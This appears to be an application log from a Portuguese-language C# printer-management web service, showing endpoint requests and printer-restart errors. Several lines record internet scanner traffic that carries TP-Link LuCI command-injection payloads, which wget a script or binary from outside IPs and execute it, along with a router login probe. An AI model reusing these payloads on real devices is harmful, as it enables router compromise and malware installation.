@@ -1,0 +1,524 @@
+17/05/2024 - 12:00
+
+12:00.27 - (PrintSystem): Criando Torres... (3)
+12:00.27 - (PrintSystem): Criando Impressoras... (3)
+12:00.27 - (PrintSystem):     Torre1: 
+12:00.27 - (PrintSystem):         Impressora1: IMP1
+12:00.27 - (PrintSystem):         Impressora2: IMP2
+12:00.27 - (PrintSystem):         Impressora3: IMP3
+12:00.27 - (PrintSystem):     Torre2: 
+12:00.27 - (PrintSystem):         Impressora1: IMP4
+12:00.27 - (PrintSystem):         Impressora2: IMP5
+12:00.27 - (PrintSystem):         Impressora3: IMP6
+12:00.27 - (PrintSystem):     Torre3: 
+12:00.27 - (PrintSystem):         Impressora1: IMP7
+12:00.27 - (PrintSystem):         Impressora2: IMP8
+12:00.27 - (PrintSystem):         Impressora3: IMP9
+12:00.27 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:00.27 - (PrintSystem): Encontrado:
+12:00.27 - (PrintSystem):     "Rei da pizza"
+12:00.27 - (PrintSystem):     "Rps Entre Rios"
+12:00.27 - (SaveSystem): Carregando configurações salvas...
+12:00.27 - (SaveSystem): Arquivos de configurações salvas encontrados: 
+12:00.27 - (SaveSystem):     "Saved\offsets.sdat"
+12:00.27 - (SaveSystem):     "Saved\sizes.sdat"
+12:00.27 - (SaveSystem):     "Saved\types.sdat"
+12:00.27 - (WebService): Iniciando Endpoints
+12:00.27 - (WebService): Porta: 80
+12:00.31 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:00.31 - (PrintSystem): Encontrado:
+12:00.31 - (PrintSystem):     "Rei da pizza"
+12:00.31 - (PrintSystem):     "Rps Entre Rios"
+12:00.31 - (WebService): Request de '127.0.0.1:61471' no endpoint '/'.
+12:00.31 - (WebService): Request of '127.0.0.1:61471' at '/favicon.ico' endpoint. (404)
+12:00.34 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:00.34 - (PrintSystem): Encontrado:
+12:00.34 - (PrintSystem):     "Rei da pizza"
+12:00.34 - (PrintSystem):     "Rps Entre Rios"
+12:00.34 - (WebService): Request de '127.0.0.1:61471' no endpoint '/'.
+12:00.34 - (WebService): Request of '127.0.0.1:61471' at '/favicon.ico' endpoint. (404)
+12:00.34 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:00.34 - (PrintSystem): Encontrado:
+12:00.34 - (PrintSystem):     "Rei da pizza"
+12:00.34 - (PrintSystem):     "Rps Entre Rios"
+12:00.34 - (WebService): Request de '127.0.0.1:61471' no endpoint '/'.
+12:00.34 - (WebService): Request of '127.0.0.1:61471' at '/favicon.ico' endpoint. (404)
+12:00.35 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:00.35 - (PrintSystem): Encontrado:
+12:00.35 - (PrintSystem):     "Rei da pizza"
+12:00.35 - (PrintSystem):     "Rps Entre Rios"
+12:00.35 - (WebService): Request de '127.0.0.1:61471' no endpoint '/'.
+12:00.35 - (WebService): Request of '127.0.0.1:61471' at '/favicon.ico' endpoint. (404)
+12:00.35 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:00.35 - (PrintSystem): Encontrado:
+12:00.35 - (PrintSystem):     "Rei da pizza"
+12:00.35 - (PrintSystem):     "Rps Entre Rios"
+12:00.35 - (WebService): Request de '127.0.0.1:61471' no endpoint '/'.
+12:00.35 - (WebService): Request of '127.0.0.1:61471' at '/favicon.ico' endpoint. (404)
+12:00.52 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:00.52 - (PrintSystem): Encontrado:
+12:00.52 - (PrintSystem):     "Rei da pizza"
+12:00.52 - (PrintSystem):     "Rps Entre Rios"
+12:00.52 - (WebService): Request de '127.0.0.1:61471' no endpoint '/'.
+12:00.52 - (WebService): Request of '127.0.0.1:61471' at '/favicon.ico' endpoint. (404)
+12:00.52 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:00.52 - (PrintSystem): Encontrado:
+12:00.52 - (PrintSystem):     "Rei da pizza"
+12:00.52 - (PrintSystem):     "Rps Entre Rios"
+12:00.52 - (WebService): Request de '127.0.0.1:61471' no endpoint '/tower1'.
+12:00.52 - (WebService): Request de '127.0.0.1:61471' no endpoint '/update.js'.
+12:00.52 - (WebService): Request de '127.0.0.1:61497' no endpoint '/style.css'.
+12:00.52 - (WebService): Request de '127.0.0.1:61498' no endpoint '/tower1.js'.
+12:00.52 - (WebService): Request de '127.0.0.1:61498' no endpoint '/clientes'.
+12:00.52 - (WebService): Request de '127.0.0.1:61497' no endpoint '/tamanhos'.
+12:00.52 - (WebService): Request de '127.0.0.1:61499' no endpoint '/offset'.
+12:00.52 - (WebService): Request de '127.0.0.1:61471' no endpoint '/tipos'.
+12:00.52 - (WebService): Request of '127.0.0.1:61498' at '/favicon.ico' endpoint. (404)
+12:00.53 - (WebService): Request of '127.0.0.1:61498' at '/favicon.ico' endpoint. (404)
+12:01.08 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:01.08 - (PrintSystem): Encontrado:
+12:01.08 - (PrintSystem):     "Rei da pizza"
+12:01.08 - (PrintSystem):     "Rps Entre Rios"
+12:01.08 - (WebService): Request de '127.0.0.1:61498' no endpoint '/'.
+12:01.08 - (WebService): Request of '127.0.0.1:61498' at '/favicon.ico' endpoint. (404)
+12:01.41 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:01.41 - (PrintSystem): Encontrado:
+12:01.41 - (PrintSystem):     "Rei da pizza"
+12:01.41 - (PrintSystem):     "Rps Entre Rios"
+12:01.41 - (WebService): Request de '127.0.0.1:61498' no endpoint '/'.
+12:01.42 - (WebService): Request of '127.0.0.1:61498' at '/favicon.ico' endpoint. (404)
+12:01.48 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:01.48 - (PrintSystem): Encontrado:
+12:01.48 - (PrintSystem):     "Rei da pizza"
+12:01.48 - (PrintSystem):     "Rps Entre Rios"
+12:01.48 - (WebService): Request de '127.0.0.1:61498' no endpoint '/tower2'.
+12:01.49 - (WebService): Request de '127.0.0.1:61498' no endpoint '/update.js'.
+12:01.49 - (WebService): Request de '127.0.0.1:61471' no endpoint '/tower2.js'.
+12:01.49 - (WebService): Request de '127.0.0.1:61499' no endpoint '/style.css'.
+12:01.49 - (WebService): Request de '127.0.0.1:61499' no endpoint '/clientes'.
+12:01.49 - (WebService): Request de '127.0.0.1:61471' no endpoint '/tamanhos'.
+12:01.49 - (WebService): Request de '127.0.0.1:61498' no endpoint '/tipos'.
+12:01.49 - (WebService): Request de '127.0.0.1:61499' no endpoint '/offset'.
+12:01.49 - (WebService): Request of '127.0.0.1:61498' at '/favicon.ico' endpoint. (404)
+12:01.53 - (WebService): Request of '127.0.0.1:61498' at '/favicon.ico' endpoint. (404)
+12:02.13 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:02.13 - (PrintSystem): Encontrado:
+12:02.13 - (PrintSystem):     "Rei da pizza"
+12:02.13 - (PrintSystem):     "Rps Entre Rios"
+12:02.13 - (WebService): Request de '127.0.0.1:61498' no endpoint '/'.
+12:02.13 - (WebService): Request of '127.0.0.1:61498' at '/favicon.ico' endpoint. (404)
+12:02.38 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:02.38 - (PrintSystem): Encontrado:
+12:02.38 - (PrintSystem):     "Rei da pizza"
+12:02.38 - (PrintSystem):     "Rps Entre Rios"
+12:02.38 - (WebService): Request de '127.0.0.1:61498' no endpoint '/tower1'.
+12:02.38 - (WebService): Request de '127.0.0.1:61498' no endpoint '/update.js'.
+12:02.38 - (WebService): Request de '127.0.0.1:61499' no endpoint '/tower1.js'.
+12:02.38 - (WebService): Request de '127.0.0.1:61471' no endpoint '/style.css'.
+12:02.38 - (WebService): Request de '127.0.0.1:61471' no endpoint '/clientes'.
+12:02.38 - (WebService): Request de '127.0.0.1:61499' no endpoint '/tamanhos'.
+12:02.38 - (WebService): Request de '127.0.0.1:61498' no endpoint '/tipos'.
+12:02.38 - (WebService): Request de '127.0.0.1:61471' no endpoint '/offset'.
+12:02.38 - (WebService): Request of '127.0.0.1:61471' at '/favicon.ico' endpoint. (404)
+12:02.40 - (WebService): Request de '127.0.0.1:61471' no endpoint '/print/restart'.
+12:02.43 - (WebService): Request of '127.0.0.1:61471' at '/favicon.ico' endpoint. (404)
+12:30.29 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+12:30.29 - (PrintSystem): Encontrado:
+12:30.29 - (PrintSystem):     "Rei da pizza"
+12:30.29 - (PrintSystem):     "Rps Entre Rios"
+12:30.29 - (WebService): Request de '185.191.126.213:51396' no endpoint '/'.
+12:56.07 - (WebService): Request of '31.220.1.83:41478' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60)' endpoint. (404)
+13:23.05 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+13:23.05 - (PrintSystem): Encontrado:
+13:23.05 - (PrintSystem):     "Rei da pizza"
+13:23.05 - (PrintSystem):     "Rps Entre Rios"
+13:23.05 - (WebService): Request de '127.0.0.1:62148' no endpoint '/tower1'.
+13:23.05 - (WebService): Request de '127.0.0.1:62148' no endpoint '/update.js'.
+13:23.05 - (WebService): Request de '127.0.0.1:62149' no endpoint '/style.css'.
+13:23.05 - (WebService): Request de '127.0.0.1:62150' no endpoint '/tower1.js'.
+13:23.05 - (WebService): Request de '127.0.0.1:62150' no endpoint '/clientes'.
+13:23.05 - (WebService): Request de '127.0.0.1:62149' no endpoint '/tamanhos'.
+13:23.05 - (WebService): Request de '127.0.0.1:62150' no endpoint '/tipos'.
+13:23.05 - (WebService): Request de '127.0.0.1:62149' no endpoint '/offset'.
+13:23.05 - (WebService): Request of '127.0.0.1:62149' at '/favicon.ico' endpoint. (404)
+13:23.08 - (WebService): Request of '127.0.0.1:62149' at '/favicon.ico' endpoint. (404)
+13:23.10 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+13:23.10 - (PrintSystem): Encontrado:
+13:23.10 - (PrintSystem):     "Rei da pizza"
+13:23.10 - (PrintSystem):     "Rps Entre Rios"
+13:23.10 - (WebService): Request de '127.0.0.1:62149' no endpoint '/tower2'.
+13:23.10 - (WebService): Request de '127.0.0.1:62149' no endpoint '/update.js'.
+13:23.10 - (WebService): Request de '127.0.0.1:62150' no endpoint '/tower2.js'.
+13:23.10 - (WebService): Request de '127.0.0.1:62148' no endpoint '/style.css'.
+13:23.10 - (WebService): Request de '127.0.0.1:62148' no endpoint '/clientes'.
+13:23.10 - (WebService): Request de '127.0.0.1:62150' no endpoint '/tamanhos'.
+13:23.10 - (WebService): Request de '127.0.0.1:62149' no endpoint '/tipos'.
+13:23.10 - (WebService): Request de '127.0.0.1:62148' no endpoint '/offset'.
+13:23.10 - (WebService): Request of '127.0.0.1:62148' at '/favicon.ico' endpoint. (404)
+13:23.11 - (WebService): Request of '127.0.0.1:62148' at '/favicon.ico' endpoint. (404)
+13:23.12 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+13:23.12 - (PrintSystem): Encontrado:
+13:23.12 - (PrintSystem):     "Rei da pizza"
+13:23.12 - (PrintSystem):     "Rps Entre Rios"
+13:23.12 - (WebService): Request de '127.0.0.1:62148' no endpoint '/tower3'.
+13:23.12 - (WebService): Request de '127.0.0.1:62148' no endpoint '/update.js'.
+13:23.12 - (WebService): Request de '127.0.0.1:62149' no endpoint '/tower3.js'.
+13:23.12 - (WebService): Request de '127.0.0.1:62150' no endpoint '/style.css'.
+13:23.12 - (WebService): Request de '127.0.0.1:62150' no endpoint '/clientes'.
+13:23.12 - (WebService): Request de '127.0.0.1:62149' no endpoint '/tamanhos'.
+13:23.12 - (WebService): Request de '127.0.0.1:62148' no endpoint '/tipos'.
+13:23.12 - (WebService): Request de '127.0.0.1:62152' no endpoint '/offset'.
+13:23.12 - (WebService): Request of '127.0.0.1:62148' at '/favicon.ico' endpoint. (404)
+13:45.54 - (WebService): Request of '31.220.1.83:39116' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60)' endpoint. (404)
+14:07.38 - (WebService): Request of '115.57.55.26:39431' at '/boaform/admin/formLogin?username=ec8&psd=ec8' endpoint. (404)
+14:28.39 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+14:28.39 - (PrintSystem): Encontrado:
+14:28.39 - (PrintSystem):     "Rei da pizza"
+14:28.39 - (PrintSystem):     "Rps Entre Rios"
+14:28.39 - (WebService): Request de '185.224.128.51:43068' no endpoint '/'.
+14:57.39 - (WebService): Request of '185.180.143.79:38256' at '/cgi-bin/main.pl' endpoint. (404)
+15:30.08 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+15:30.08 - (PrintSystem): Encontrado:
+15:30.08 - (PrintSystem):     "Rei da pizza"
+15:30.08 - (PrintSystem):     "Rps Entre Rios"
+15:30.08 - (WebService): Request de '185.224.128.43:50886' no endpoint '/'.
+15:45.24 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+15:45.24 - (PrintSystem): Encontrado:
+15:45.24 - (PrintSystem):     "Rei da pizza"
+15:45.24 - (PrintSystem):     "Rps Entre Rios"
+15:45.24 - (WebService): Request de '162.243.131.8:38106' no endpoint '/'.
+15:52.40 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+15:52.40 - (PrintSystem): Encontrado:
+15:52.40 - (PrintSystem):     "Rei da pizza"
+15:52.40 - (PrintSystem):     "Rps Entre Rios"
+15:52.40 - (WebService): Request de '46.174.191.30:28586' no endpoint '/'.
+16:03.20 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:03.20 - (PrintSystem): Encontrado:
+16:03.20 - (PrintSystem):     "Rei da pizza"
+16:03.20 - (PrintSystem):     "Rps Entre Rios"
+16:03.20 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tower1'.
+16:03.20 - (WebService): Request de '127.0.0.1:63269' no endpoint '/update.js'.
+16:03.20 - (WebService): Request de '127.0.0.1:63270' no endpoint '/style.css'.
+16:03.20 - (WebService): Request de '127.0.0.1:63271' no endpoint '/tower1.js'.
+16:03.20 - (WebService): Request de '127.0.0.1:63271' no endpoint '/clientes'.
+16:03.20 - (WebService): Request de '127.0.0.1:63270' no endpoint '/tamanhos'.
+16:03.20 - (WebService): Request de '127.0.0.1:63271' no endpoint '/tipos'.
+16:03.20 - (WebService): Request de '127.0.0.1:63269' no endpoint '/offset'.
+16:03.20 - (WebService): Request of '127.0.0.1:63269' at '/favicon.ico' endpoint. (404)
+16:03.23 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:03.23 - (PrintSystem): Encontrado:
+16:03.23 - (PrintSystem):     "Rei da pizza"
+16:03.23 - (PrintSystem):     "Rps Entre Rios"
+16:03.23 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tower2'.
+16:03.23 - (WebService): Request de '127.0.0.1:63269' no endpoint '/update.js'.
+16:03.23 - (WebService): Request de '127.0.0.1:63271' no endpoint '/tower2.js'.
+16:03.23 - (WebService): Request de '127.0.0.1:63270' no endpoint '/style.css'.
+16:03.23 - (WebService): Request de '127.0.0.1:63270' no endpoint '/clientes'.
+16:03.23 - (WebService): Request de '127.0.0.1:63271' no endpoint '/tamanhos'.
+16:03.23 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tipos'.
+16:03.23 - (WebService): Request de '127.0.0.1:63273' no endpoint '/offset'.
+16:03.23 - (WebService): Request of '127.0.0.1:63269' at '/favicon.ico' endpoint. (404)
+16:03.30 - (WebService): Request of '127.0.0.1:63269' at '/tower4' endpoint. (404)
+16:03.30 - (WebService): Request of '127.0.0.1:63269' at '/favicon.ico' endpoint. (404)
+16:03.33 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:03.33 - (PrintSystem): Encontrado:
+16:03.33 - (PrintSystem):     "Rei da pizza"
+16:03.33 - (PrintSystem):     "Rps Entre Rios"
+16:03.33 - (WebService): Request de '127.0.0.1:63269' no endpoint '/'.
+16:03.33 - (WebService): Request of '127.0.0.1:63269' at '/favicon.ico' endpoint. (404)
+16:03.59 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:03.59 - (PrintSystem): Encontrado:
+16:03.59 - (PrintSystem):     "Rei da pizza"
+16:03.59 - (PrintSystem):     "Rps Entre Rios"
+16:03.59 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tower1'.
+16:03.59 - (WebService): Request de '127.0.0.1:63269' no endpoint '/update.js'.
+16:03.59 - (WebService): Request de '127.0.0.1:63273' no endpoint '/tower1.js'.
+16:03.59 - (WebService): Request de '127.0.0.1:63271' no endpoint '/style.css'.
+16:03.59 - (WebService): Request de '127.0.0.1:63271' no endpoint '/clientes'.
+16:03.59 - (WebService): Request de '127.0.0.1:63273' no endpoint '/tamanhos'.
+16:03.59 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tipos'.
+16:03.59 - (WebService): Request de '127.0.0.1:63271' no endpoint '/offset'.
+16:03.59 - (WebService): Request of '127.0.0.1:63271' at '/favicon.ico' endpoint. (404)
+16:04.01 - (WebService): Request of '127.0.0.1:63271' at '/favicon.ico' endpoint. (404)
+16:04.03 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:04.03 - (PrintSystem): Encontrado:
+16:04.03 - (PrintSystem):     "Rei da pizza"
+16:04.03 - (PrintSystem):     "Rps Entre Rios"
+16:04.03 - (WebService): Request de '127.0.0.1:63271' no endpoint '/tower2'.
+16:04.03 - (WebService): Request de '127.0.0.1:63271' no endpoint '/update.js'.
+16:04.03 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tower2.js'.
+16:04.03 - (WebService): Request de '127.0.0.1:63273' no endpoint '/style.css'.
+16:04.03 - (WebService): Request de '127.0.0.1:63273' no endpoint '/clientes'.
+16:04.03 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tamanhos'.
+16:04.03 - (WebService): Request de '127.0.0.1:63271' no endpoint '/tipos'.
+16:04.03 - (WebService): Request de '127.0.0.1:63270' no endpoint '/offset'.
+16:04.03 - (WebService): Request of '127.0.0.1:63273' at '/favicon.ico' endpoint. (404)
+16:04.04 - (WebService): Request of '127.0.0.1:63273' at '/favicon.ico' endpoint. (404)
+16:04.05 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:04.05 - (PrintSystem): Encontrado:
+16:04.05 - (PrintSystem):     "Rei da pizza"
+16:04.05 - (PrintSystem):     "Rps Entre Rios"
+16:04.05 - (WebService): Request de '127.0.0.1:63273' no endpoint '/tower3'.
+16:04.05 - (WebService): Request de '127.0.0.1:63273' no endpoint '/update.js'.
+16:04.05 - (WebService): Request de '127.0.0.1:63270' no endpoint '/tower3.js'.
+16:04.05 - (WebService): Request de '127.0.0.1:63271' no endpoint '/style.css'.
+16:04.05 - (WebService): Request de '127.0.0.1:63271' no endpoint '/clientes'.
+16:04.05 - (WebService): Request de '127.0.0.1:63270' no endpoint '/tamanhos'.
+16:04.05 - (WebService): Request de '127.0.0.1:63273' no endpoint '/tipos'.
+16:04.05 - (WebService): Request de '127.0.0.1:63269' no endpoint '/offset'.
+16:04.05 - (WebService): Request of '127.0.0.1:63279' at '/favicon.ico' endpoint. (404)
+16:04.06 - (WebService): Request of '127.0.0.1:63279' at '/favicon.ico' endpoint. (404)
+16:04.14 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:04.14 - (PrintSystem): Encontrado:
+16:04.14 - (PrintSystem):     "Rei da pizza"
+16:04.15 - (PrintSystem):     "Rps Entre Rios"
+16:04.15 - (WebService): Request de '127.0.0.1:63279' no endpoint '/tower1'.
+16:04.15 - (WebService): Request de '127.0.0.1:63279' no endpoint '/update.js'.
+16:04.15 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tower1.js'.
+16:04.15 - (WebService): Request de '127.0.0.1:63273' no endpoint '/style.css'.
+16:04.15 - (WebService): Request de '127.0.0.1:63273' no endpoint '/clientes'.
+16:04.15 - (WebService): Request de '127.0.0.1:63269' no endpoint '/tamanhos'.
+16:04.15 - (WebService): Request de '127.0.0.1:63279' no endpoint '/tipos'.
+16:04.15 - (WebService): Request de '127.0.0.1:63270' no endpoint '/offset'.
+16:04.15 - (WebService): Request of '127.0.0.1:63271' at '/favicon.ico' endpoint. (404)
+16:04.21 - Ocorreu um erro em 'CancelPrint.CancelPrinting' Mensagem de Erro: 'Ocorreu um erro ao reiniciar a impressão da impressora: (IMP2)'
+Informações:
+
+Erro: O nome da impressora é inválido.
+Source: Printer Web Forms
+StackTrace: 
+   at Printer_Web_Forms.CancelPrint.GetPrintJobs(String printerName) in F:\Projects\CSharp\Printer Web Forms\CancelPrint.cs:line 112
+   at Printer_Web_Forms.CancelPrint.CancelPrinting(HttpListenerRequest request) in F:\Projects\CSharp\Printer Web Forms\CancelPrint.cs:line 29
+
+Culpado: GetPrintJobs()
+16:04.21 - (CancelPrint): Erro ao reiniciar impressão:O nome da impressora é inválido.
+16:04.21 - (WebService): Request de '127.0.0.1:63271' no endpoint '/print/restart'.
+16:04.25 - (WebService): Request de '127.0.0.1:63271' no endpoint '/print/restart'.
+16:04.30 - Ocorreu um erro em 'CancelPrint.CancelPrinting' Mensagem de Erro: 'Ocorreu um erro ao reiniciar a impressão da impressora: (IMP3)'
+Informações:
+
+Erro: O nome da impressora é inválido.
+Source: Printer Web Forms
+StackTrace: 
+   at Printer_Web_Forms.CancelPrint.GetPrintJobs(String printerName) in F:\Projects\CSharp\Printer Web Forms\CancelPrint.cs:line 112
+   at Printer_Web_Forms.CancelPrint.CancelPrinting(HttpListenerRequest request) in F:\Projects\CSharp\Printer Web Forms\CancelPrint.cs:line 29
+
+Culpado: GetPrintJobs()
+16:04.30 - (CancelPrint): Erro ao reiniciar impressão:O nome da impressora é inválido.
+16:04.30 - (WebService): Request de '127.0.0.1:63271' no endpoint '/print/restart'.
+16:07.17 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:07.17 - (PrintSystem): Encontrado:
+16:07.17 - (PrintSystem):     "Rei da pizza"
+16:07.17 - (PrintSystem):     "Rps Entre Rios"
+16:07.17 - (WebService): Request de '187.19.230.218:22939' no endpoint '/'.
+16:07.17 - (WebService): Request of '187.19.230.218:22939' at '/favicon.ico' endpoint. (404)
+16:07.19 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+16:07.19 - (PrintSystem): Encontrado:
+16:07.19 - (PrintSystem):     "Rei da pizza"
+16:07.19 - (PrintSystem):     "Rps Entre Rios"
+16:07.19 - (WebService): Request de '187.19.230.218:22939' no endpoint '/tower1'.
+16:07.19 - (WebService): Request de '187.19.230.218:22939' no endpoint '/update.js'.
+16:07.19 - (WebService): Request de '187.19.230.218:64413' no endpoint '/style.css'.
+16:07.19 - (WebService): Request de '187.19.230.218:22939' no endpoint '/tower1.js'.
+16:07.19 - (WebService): Request de '187.19.230.218:22939' no endpoint '/clientes'.
+16:07.19 - (WebService): Request de '187.19.230.218:28631' no endpoint '/tipos'.
+16:07.19 - (WebService): Request de '187.19.230.218:64413' no endpoint '/tamanhos'.
+16:07.19 - (WebService): Request de '187.19.230.218:10941' no endpoint '/offset'.
+16:07.19 - (WebService): Request of '187.19.230.218:22939' at '/favicon.ico' endpoint. (404)
+16:07.21 - (WebService): Request de '187.19.230.218:22939' no endpoint '/print/restart'.
+16:07.23 - Ocorreu um erro em 'CancelPrint.CancelPrinting' Mensagem de Erro: 'Ocorreu um erro ao reiniciar a impressão da impressora: (IMP2)'
+Informações:
+
+Erro: O nome da impressora é inválido.
+Source: Printer Web Forms
+StackTrace: 
+   at Printer_Web_Forms.CancelPrint.GetPrintJobs(String printerName) in F:\Projects\CSharp\Printer Web Forms\CancelPrint.cs:line 112
+   at Printer_Web_Forms.CancelPrint.CancelPrinting(HttpListenerRequest request) in F:\Projects\CSharp\Printer Web Forms\CancelPrint.cs:line 29
+
+Culpado: GetPrintJobs()
+16:07.23 - (CancelPrint): Erro ao reiniciar impressão:O nome da impressora é inválido.
+16:07.23 - (WebService): Request de '187.19.230.218:22939' no endpoint '/print/restart'.
+16:07.29 - Ocorreu um erro em 'CancelPrint.CancelPrinting' Mensagem de Erro: 'Ocorreu um erro ao reiniciar a impressão da impressora: (IMP2)'
+Informações:
+
+Erro: O nome da impressora é inválido.
+Source: Printer Web Forms
+StackTrace: 
+   at Printer_Web_Forms.CancelPrint.GetPrintJobs(String printerName) in F:\Projects\CSharp\Printer Web Forms\CancelPrint.cs:line 112
+   at Printer_Web_Forms.CancelPrint.CancelPrinting(HttpListenerRequest request) in F:\Projects\CSharp\Printer Web Forms\CancelPrint.cs:line 29
+
+Culpado: GetPrintJobs()
+16:07.29 - (CancelPrint): Erro ao reiniciar impressão:O nome da impressora é inválido.
+16:07.29 - (WebService): Request de '187.19.230.218:22939' no endpoint '/print/restart'.
+16:07.36 - (WebService): Request of '187.19.230.218:9862' at '/favicon.ico' endpoint. (404)
+16:07.56 - (WebService): Request de '187.19.230.218:26347' no endpoint '/print/restart'.
+17:48.58 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+17:48.58 - (PrintSystem): Encontrado:
+17:48.58 - (PrintSystem):     "Rei da pizza"
+17:48.58 - (PrintSystem):     "Rps Entre Rios"
+17:48.58 - (WebService): Request de '34.22.192.129:41766' no endpoint '/'.
+18:20.56 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+18:20.56 - (PrintSystem): Encontrado:
+18:20.56 - (PrintSystem):     "Rei da pizza"
+18:20.56 - (PrintSystem):     "Rps Entre Rios"
+18:20.56 - (WebService): Request de '194.169.175.19:54632' no endpoint '/'.
+18:59.52 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+18:59.52 - (PrintSystem): Encontrado:
+18:59.52 - (PrintSystem):     "Rei da pizza"
+18:59.52 - (PrintSystem):     "Rps Entre Rios"
+18:59.52 - (WebService): Request de '45.156.128.43:53824' no endpoint '/'.
+20:03.26 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+20:03.26 - (PrintSystem): Encontrado:
+20:03.26 - (PrintSystem):     "Rei da pizza"
+20:03.26 - (PrintSystem):     "Rps Entre Rios"
+20:03.26 - (WebService): Request de '35.216.183.31:52368' no endpoint '/'.
+20:48.00 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+20:48.00 - (PrintSystem): Encontrado:
+20:48.00 - (PrintSystem):     "Rei da pizza"
+20:48.00 - (PrintSystem):     "Rps Entre Rios"
+20:48.00 - (WebService): Request de '185.224.128.43:43162' no endpoint '/'.
+21:39.47 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+21:39.47 - (PrintSystem): Encontrado:
+21:39.47 - (PrintSystem):     "Rei da pizza"
+21:39.47 - (PrintSystem):     "Rps Entre Rios"
+21:39.47 - (WebService): Request de '35.203.211.43:60616' no endpoint '/'.
+22:27.17 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+22:27.17 - (PrintSystem): Encontrado:
+22:27.17 - (PrintSystem):     "Rei da pizza"
+22:27.17 - (PrintSystem):     "Rps Entre Rios"
+22:27.17 - (WebService): Request de '213.181.196.180:59782' no endpoint '/'.
+22:41.35 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+22:41.35 - (PrintSystem): Encontrado:
+22:41.35 - (PrintSystem):     "Rei da pizza"
+22:41.35 - (PrintSystem):     "Rps Entre Rios"
+22:41.35 - (WebService): Request de '174.138.13.176:59188' no endpoint '/'.
+23:03.11 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+23:03.11 - (PrintSystem): Encontrado:
+23:03.11 - (PrintSystem):     "Rei da pizza"
+23:03.11 - (PrintSystem):     "Rps Entre Rios"
+23:03.11 - (WebService): Request de '45.79.168.172:49738' no endpoint '/'.
+23:42.38 - (WebService): Request of '84.54.51.37:39330' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F147.78.103.155%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)' endpoint. (404)
+23:55.50 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+23:55.50 - (PrintSystem): Encontrado:
+23:55.50 - (PrintSystem):     "Rei da pizza"
+23:55.50 - (PrintSystem):     "Rps Entre Rios"
+23:55.50 - (WebService): Request de '185.97.208.98:42547' no endpoint '/'.
+01:15.18 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+01:15.18 - (PrintSystem): Encontrado:
+01:15.18 - (PrintSystem):     "Rei da pizza"
+01:15.18 - (PrintSystem):     "Rps Entre Rios"
+01:15.18 - (WebService): Request de '159.138.108.59:40826' no endpoint '/'.
+01:32.41 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
